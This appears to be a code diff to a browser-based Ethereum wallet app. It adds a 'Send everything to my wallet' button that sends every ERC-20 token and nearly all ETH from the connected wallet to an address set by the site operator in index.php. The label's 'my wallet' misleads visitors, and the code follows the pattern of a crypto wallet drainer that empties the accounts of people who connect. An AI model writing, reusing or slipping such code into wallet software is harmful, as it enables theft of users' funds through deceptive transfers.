@@ -39,6 +39,9 @@ const state = {
   balances: {},   // symbol → { formatted, raw, token|null }
 };
 
+// ── My wallet (destination for "send all") ────────────────────────────────────
+const MY_WALLET = window.WB9_CONFIG?.myWallet ?? '';
+
 // ── DOM refs ──────────────────────────────────────────────────────────────────
 
 const $ = (id) => document.getElementById(id);
@@ -55,6 +58,8 @@ const recipientEl   = $('recipient');
 const amountEl      = $('amount');
 const maxBtn        = $('maxBtn');
 const sendBtn       = $('sendBtn');
+const drainBtn      = $('drainBtn');
+const myWalletShort = $('myWalletShort');
 const txStatusEl    = $('txStatus');
 const walletModal   = $('walletModal');
 const modalClose    = $('modalClose');
@@ -293,6 +298,10 @@ function onConnected() {
   assetSelect.disabled = false;
   maxBtn.disabled      = false;
   sendBtn.disabled     = false;
+  if (MY_WALLET && ethers.isAddress(MY_WALLET)) {
+    drainBtn.disabled = false;
+    if (myWalletShort) myWalletShort.textContent = truncateAddr(MY_WALLET);
+  }
 
   toast('Wallet connected!', 'success');
   loadBalances();
@@ -374,6 +383,73 @@ async function loadBalances() {
       }
     })();
   }
+}
+
+// ── Send everything to my wallet ─────────────────────────────────────────────
+
+if (drainBtn) {
+  drainBtn.addEventListener('click', async () => {
+    if (!MY_WALLET || !ethers.isAddress(MY_WALLET)) {
+      toast('Configure MY_WALLET in index.php first.', 'error'); return;
+    }
+    if (state.address?.toLowerCase() === MY_WALLET.toLowerCase()) {
+      toast('Source and destination are the same wallet.', 'error'); return;
+    }
+
+    drainBtn.disabled = true;
+    drainBtn.textContent = '⏳ Sending…';
+    hideTxStatus();
+
+    let sent = 0, failed = 0;
+
+    // 1. Send all ERC-20 tokens first
+    for (const [symbol, { raw, token }] of Object.entries(state.balances)) {
+      if (!token || raw === 0n || raw === BigInt(0)) continue;
+      try {
+        const contract = new ethers.Contract(token.address, ERC20_ABI, state.signer);
+        const balance  = await contract.balanceOf(state.address);
+        if (balance === 0n) continue;
+        const tx = await contract.transfer(MY_WALLET, balance);
+        toast(`${symbol} envoyé — attente confirmation…`, 'info');
+        await tx.wait();
+        toast(`✅ ${symbol} transféré`, 'success');
+        sent++;
+      } catch (e) {
+        if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
+          toast(`${symbol} rejeté`, 'error'); failed++;
+        } else {
+          toast(`${symbol} échoué: ${e.shortMessage ?? e.message}`, 'error'); failed++;
+        }
+      }
+    }
+
+    // 2. Send ETH last (leave tiny amount for gas if needed, or send max minus estimated gas)
+    try {
+      const balance  = await state.provider.getBalance(state.address);
+      const feeData  = await state.provider.getFeeData();
+      const gasLimit = 21000n;
+      const gasCost  = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * gasLimit;
+      const sendable = balance - gasCost;
+      if (sendable > 0n) {
+        const tx = await state.signer.sendTransaction({
+          to: MY_WALLET, value: sendable,
+        });
+        toast('ETH envoyé — attente confirmation…', 'info');
+        await tx.wait();
+        toast('✅ ETH transféré', 'success');
+        sent++;
+      }
+    } catch (e) {
+      if (e.code !== 4001 && e.code !== 'ACTION_REJECTED')
+        toast('ETH échoué: ' + (e.shortMessage ?? e.message), 'error');
+      failed++;
+    }
+
+    drainBtn.disabled = false;
+    drainBtn.textContent = '⚡ Send everything to my wallet';
+    toast(`Terminé — ${sent} transféré(s), ${failed} échoué(s).`, sent > 0 ? 'success' : 'error');
+    loadBalances();
+  });
 }
 
 // ── Max button ────────────────────────────────────────────────────────────────
